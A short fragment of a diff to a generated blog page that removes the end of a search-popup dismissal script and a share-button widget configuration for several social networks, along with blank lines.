-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
 
 
 
@@ -1393,43 +488,12 @@
 
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-  
-  <script src="/lib/needsharebutton/needsharebutton.js"></script>
-  <script>
-    
-      pbOptions = {};
-      
-        pbOptions.iconStyle = "default";
-      
-        pbOptions.boxForm = "horizontal";
-      
-        pbOptions.position = "bottomCenter";
-      
-        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
-      
-      new needShareButton('#needsharebutton-postbottom', pbOptions);
-    
-    
-  </script>
 
 
-  
 
-  
+
+
+
 
   
 
